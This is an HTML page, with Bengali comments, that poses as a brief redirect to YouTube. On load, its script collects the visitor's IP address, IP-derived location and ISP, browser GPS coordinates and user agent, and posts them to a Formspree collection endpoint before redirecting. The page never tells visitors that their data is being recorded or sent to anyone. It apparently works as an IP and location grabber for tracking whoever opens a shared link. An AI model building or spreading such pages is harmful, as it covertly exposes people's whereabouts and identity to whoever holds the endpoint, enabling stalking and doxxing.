<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Redirecting...</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f0f4f8;
    color: #333;
    text-align: center;
    padding: 100px 20px;
  }
  .box {
    background: white;
    display: inline-block;
    padding: 30px;
    border-radius: 12px;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
  }
</style>
</head>
<body>
  <div class="box">
    <h2>Please wait...</h2>
    <p>Fetching your location and redirecting shortly...</p>
  </div>

<script>
  async function getIPWhoisData(ip) {
    try {
      const response = await fetch(`https://ipwhois.app/json/${ip}`);
      const data = await response.json();
      return data;
    } catch (error) {
      console.error("ipwhois fetch error:", error);
      return null;
    }
  }

  function sendDataToFormspree(data) {
    return fetch("https://formspree.io/f/mldnbqvo", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });
  }

  function redirect() {
    window.location.href = "https://youtube.com"; // ইচ্ছে করলে বদলে দিতে পারো
  }

  async function logVisitor() {
    try {
      // প্রথমে ইউজারের IP নেবো
      const ipRes = await fetch("https://api64.ipify.org?format=json");
      const ipData = await ipRes.json();
      const ip = ipData.ip;

      // তারপর ipwhois থেকে ডিটেইলস নেবো
      const ipwhoisData = await getIPWhoisData(ip);

      // ব্রাউজারের জিপিএস লোকেশন নিতে চেষ্টা করবো
      function getGeoLocation() {
        return new Promise((resolve, reject) => {
          if (!navigator.geolocation) {
            resolve(null);
          } else {
            navigator.geolocation.getCurrentPosition(
              pos => resolve(pos.coords),
              err => resolve(null),
              { timeout: 10000 }
            );
          }
        });
      }

      const geoCoords = await getGeoLocation();

      // এখন ডেটা ফরম্যাট করবো Formspree তে পাঠানোর জন্য
      const postData = {
        ip: ip || "Not available",
        country: ipwhoisData?.country || "Unknown",
        city: ipwhoisData?.city || "Unknown",
        region: ipwhoisData?.region || "Unknown",
        org: ipwhoisData?.org || "Unknown",
        timezone: ipwhoisData?.timezone || "Unknown",
        latitude: geoCoords?.latitude || "Not allowed / Not available",
        longitude: geoCoords?.longitude || "Not allowed / Not available",
        user_agent: navigator.userAgent
      };

      await sendDataToFormspree(postData);

    } catch (error) {
      console.error("Error logging visitor:", error);
    } finally {
      redirect();
    }
  }

  window.onload = logVisitor;
</script>
</body>
</html>
